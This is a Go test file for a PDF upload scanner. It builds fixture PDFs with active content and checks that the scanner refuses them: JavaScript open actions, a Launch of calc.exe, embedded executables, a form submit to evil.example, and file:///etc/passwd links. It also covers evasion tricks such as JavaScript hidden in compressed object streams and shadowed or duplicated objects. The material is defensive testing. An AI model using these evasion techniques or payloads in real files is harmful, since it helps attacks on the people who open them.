package validate_test

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/binary"
	"fmt"
	"strings"
	"testing"

	. "github.com/getfider/fider/app/pkg/assert"
	"github.com/getfider/fider/app/pkg/validate"
	"github.com/pdfcpu/pdfcpu/pkg/api"
	"github.com/pdfcpu/pdfcpu/pkg/pdfcpu/model"
)

// buildPDF writes a one-page PDF with correct xref offsets. catalogExtra goes
// into the catalog dictionary; extra objects are numbered from 4.
func buildPDF(catalogExtra, pageExtra string, extra ...string) []byte {
	objs := append([]string{
		"<< /Type /Catalog /Pages 2 0 R " + catalogExtra + " >>",
		"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
		"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] " + pageExtra + " >>",
	}, extra...)
	var b bytes.Buffer
	b.WriteString("%PDF-1.7\n")
	offsets := make([]int, len(objs))
	for i, o := range objs {
		offsets[i] = b.Len()
		fmt.Fprintf(&b, "%d 0 obj\n%s\nendobj\n", i+1, o)
	}
	xref := b.Len()
	fmt.Fprintf(&b, "xref\n0 %d\n0000000000 65535 f \n", len(objs)+1)
	for _, off := range offsets {
		fmt.Fprintf(&b, "%010d 00000 n \n", off)
	}
	fmt.Fprintf(&b, "trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n", len(objs)+1, xref)
	return b.Bytes()
}

var jsPDF = buildPDF("/OpenAction 4 0 R", "", "<< /S /JavaScript /JS (app.alert(1)) >>")

func TestScanPDF_CleanAndLinksPass(t *testing.T) {
	RegisterT(t)
	_, err := validate.ScanPDF(context.Background(), buildPDF("", ""))
	Expect(err).IsNil()
	// opening at a page is fine
	_, err = validate.ScanPDF(context.Background(), buildPDF("/OpenAction [3 0 R /Fit]", ""))
	Expect(err).IsNil()
	_, err = validate.ScanPDF(context.Background(), buildPDF("/OpenAction << /S /GoTo /D [3 0 R /Fit] >>", ""))
	Expect(err).IsNil()
	link := "/Annots [4 0 R]"
	_, err = validate.ScanPDF(context.Background(), buildPDF("", link,
		"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (https://example.com) >> >>"))
	Expect(err).IsNil()
}

func TestScanPDF_ActiveContentRefused(t *testing.T) {
	RegisterT(t)
	for name, pdf := range map[string][]byte{
		"javascript open action": jsPDF,
		"launch, name escaped":   buildPDF("/OpenAction 4 0 R", "", "<< /S /#4Cau#6Ech /F (calc.exe) >>"),
		"embedded files":         buildPDF("/Names << /EmbeddedFiles << /Names [(a.exe) 4 0 R] >> >>", "", "<< /Type /Filespec /F (a.exe) >>"),
		"submit form button": buildPDF("", "/Annots [4 0 R]",
			"<< /Type /Annot /Subtype /Widget /Rect [0 0 10 10] /A << /S /SubmitForm /F (https://evil.example) >> >>"),
		"page open action":             buildPDF("", "/AA << /O << /S /JavaScript /JS (x) >> >>"),
		"url fetched on open":          buildPDF("/OpenAction << /S /URI /URI (https://tracker.example/pixel) >>", ""),
		"url action on open, indirect": buildPDF("/OpenAction 4 0 R", "", "<< /S /URI /URI (https://tracker.example/pixel) >>"),
		"page additional actions":      buildPDF("", "/AA << /O << /S /URI /URI (https://tracker.example) >> >>"),
		"javascript link": buildPDF("", "/Annots [4 0 R]",
			"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (javascript:alert(1)) >> >>"),
		"file link": buildPDF("", "/Annots [4 0 R]",
			"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (file:///etc/passwd) >> >>"),
		"not a pdf":     []byte("%PDF-1.7\nthis is not really a pdf"),
		"no pdf header": []byte("hello"),
	} {
		if _, err := validate.ScanPDF(context.Background(), pdf); err == nil {
			t.Errorf("%s: expected refusal", name)
		}
	}
}

// packedJSPDF hides its JavaScript open action inside a Flate-compressed
// object stream, indexed by a cross-reference stream (PDF 1.5): a byte search
// for "JavaScript" finds nothing.
func packedJSPDF() []byte {
	var objStm bytes.Buffer
	zw := zlib.NewWriter(&objStm)
	header := "4 0 "
	_, _ = zw.Write([]byte(header + "<< /S /JavaScript /JS (app.alert(1)) >>"))
	_ = zw.Close()

	var b bytes.Buffer
	b.WriteString("%PDF-1.5\n")
	offsets := map[int]int{}
	write := func(n int, body string) {
		offsets[n] = b.Len()
		fmt.Fprintf(&b, "%d 0 obj\n%s\nendobj\n", n, body)
	}
	write(1, "<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
	write(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
	write(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>")
	offsets[5] = b.Len()
	fmt.Fprintf(&b, "5 0 obj\n<< /Type /ObjStm /N 1 /First %d /Filter /FlateDecode /Length %d >>\nstream\n", len(header), objStm.Len())
	b.Write(objStm.Bytes())
	b.WriteString("\nendstream\nendobj\n")

	// xref stream, /W [1 4 2]: type, offset or object stream number, generation or index
	offsets[6] = b.Len()
	var rows bytes.Buffer
	row := func(typ byte, f2 uint32, f3 uint16) {
		rows.WriteByte(typ)
		_ = binary.Write(&rows, binary.BigEndian, f2)
		_ = binary.Write(&rows, binary.BigEndian, f3)
	}
	row(0, 0, 65535)
	for _, n := range []int{1, 2, 3} {
		row(1, uint32(offsets[n]), 0)
	}
	row(2, 5, 0) // object 4 lives in object stream 5 at index 0
	row(1, uint32(offsets[5]), 0)
	row(1, uint32(offsets[6]), 0)
	fmt.Fprintf(&b, "6 0 obj\n<< /Type /XRef /Size 7 /W [1 4 2] /Root 1 0 R /Length %d >>\nstream\n", rows.Len())
	b.Write(rows.Bytes())
	fmt.Fprintf(&b, "\nendstream\nendobj\nstartxref\n%d\n%%%%EOF\n", offsets[6])
	return b.Bytes()
}

// Objects packed into a compressed object stream are scanned too.
func TestScanPDF_JavaScriptInsideObjectStreamRefused(t *testing.T) {
	RegisterT(t)
	packed := packedJSPDF()
	Expect(bytes.Contains(packed, []byte("JavaScript"))).IsFalse()
	_, err := validate.ScanPDF(context.Background(), packed)
	Expect(err).IsNotNil()
	Expect(strings.Contains(err.Error(), "active content")).IsTrue()
}

func TestScanPDF_EncryptedRefused(t *testing.T) {
	RegisterT(t)
	var out bytes.Buffer
	Expect(api.Encrypt(context.Background(), bytes.NewReader(buildPDF("", "")), &out, model.NewAESConfiguration("", "owner-secret", 256))).IsNil()
	_, err := validate.ScanPDF(context.Background(), out.Bytes())
	Expect(err).IsNotNil()
	Expect(strings.Contains(err.Error(), "encrypt")).IsTrue()
}

// withHiddenObject inserts an object definition just before the xref table,
// which still points where it did: readers that rebuild the table find it.
func withHiddenObject(pdf []byte, object string) []byte {
	at := bytes.Index(pdf, []byte("xref"))
	out := append(append(append([]byte{}, pdf[:at]...), []byte(object)...), pdf[at:]...)
	xref := bytes.LastIndex(out, []byte("xref"))
	return append(out[:bytes.LastIndex(out, []byte("startxref"))], []byte(fmt.Sprintf("startxref\n%d\n%%%%EOF\n", xref))...)
}

// A second definition of an object (what a rebuilding reader would use) is
// read as the reader would, and refused.
func TestScanPDF_ShadowedObjectRefused(t *testing.T) {
	RegisterT(t)
	pdf := buildPDF("/OpenAction 4 0 R", "", "<< /S /GoTo /D [3 0 R /Fit] >>")
	_, err := validate.ScanPDF(context.Background(), withHiddenObject(pdf, "4 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj\n"))
	Expect(err).IsNotNil()
}

// What is stored is the scanned document re-written. A dictionary with a key
// twice reads differently in different readers (pdfcpu keeps the last one,
// some readers the first): the stored copy has only the one that was scanned.
func TestScanPDF_StoresOnlyWhatWasScanned(t *testing.T) {
	RegisterT(t)
	twoFaced := buildPDF("/OpenAction 4 0 R", "", "<< /S /Launch /F (calc.exe) /S /GoTo /D [3 0 R /Fit] >>")
	Expect(bytes.Contains(twoFaced, []byte("Launch"))).IsTrue()
	clean, err := validate.ScanPDF(context.Background(), twoFaced)
	Expect(err).IsNil()
	Expect(bytes.HasPrefix(clean, []byte("%PDF-"))).IsTrue()
	Expect(bytes.Contains(clean, []byte("Launch"))).IsFalse()
	_, err = validate.ScanPDF(context.Background(), clean) // and it still reads
	Expect(err).IsNil()
}

// Every object stream is decoded to be scanned: cap how many a file may have.
func TestScanPDF_TooManyObjectStreamsRefused(t *testing.T) {
	RegisterT(t)
	_, err := validate.ScanPDF(context.Background(), manyObjectStreamsPDF(40))
	Expect(err).IsNotNil()
	_, err = validate.ScanPDF(context.Background(), manyObjectStreamsPDF(3))
	Expect(err).IsNil()
}

// manyObjectStreamsPDF packs n harmless dictionaries into n object streams.
func manyObjectStreamsPDF(n int) []byte {
	var b bytes.Buffer
	b.WriteString("%PDF-1.5\n")
	offsets := map[int]int{}
	write := func(nr int, body string) {
		offsets[nr] = b.Len()
		fmt.Fprintf(&b, "%d 0 obj\n%s\nendobj\n", nr, body)
	}
	write(1, "<< /Type /Catalog /Pages 2 0 R >>")
	write(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
	write(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>")
	// objects 4..3+n are packed, streams are 4+n..3+2n, the xref stream is 4+2n
	for i := 0; i < n; i++ {
		var z bytes.Buffer
		zw := zlib.NewWriter(&z)
		header := fmt.Sprintf("%d 0 ", 4+i)
		_, _ = zw.Write([]byte(header + "<< /Note (harmless) >>"))
		_ = zw.Close()
		nr := 4 + n + i
		offsets[nr] = b.Len()
		fmt.Fprintf(&b, "%d 0 obj\n<< /Type /ObjStm /N 1 /First %d /Filter /FlateDecode /Length %d >>\nstream\n", nr, len(header), z.Len())
		b.Write(z.Bytes())
		b.WriteString("\nendstream\nendobj\n")
	}
	xrefNr := 4 + 2*n
	offsets[xrefNr] = b.Len()
	var rows bytes.Buffer
	row := func(typ byte, f2 uint32, f3 uint16) {
		rows.WriteByte(typ)
		_ = binary.Write(&rows, binary.BigEndian, f2)
		_ = binary.Write(&rows, binary.BigEndian, f3)
	}
	row(0, 0, 65535)
	for nr := 1; nr <= 3; nr++ {
		row(1, uint32(offsets[nr]), 0)
	}
	for i := 0; i < n; i++ {
		row(2, uint32(4+n+i), 0)
	}
	for i := 0; i < n; i++ {
		row(1, uint32(offsets[4+n+i]), 0)
	}
	row(1, uint32(offsets[xrefNr]), 0)
	fmt.Fprintf(&b, "%d 0 obj\n<< /Type /XRef /Size %d /W [1 4 2] /Root 1 0 R /Length %d >>\nstream\n", xrefNr, xrefNr+1, rows.Len())
	b.Write(rows.Bytes())
	fmt.Fprintf(&b, "\nendstream\nendobj\nstartxref\n%d\n%%%%EOF\n", offsets[xrefNr])
	return b.Bytes()
}
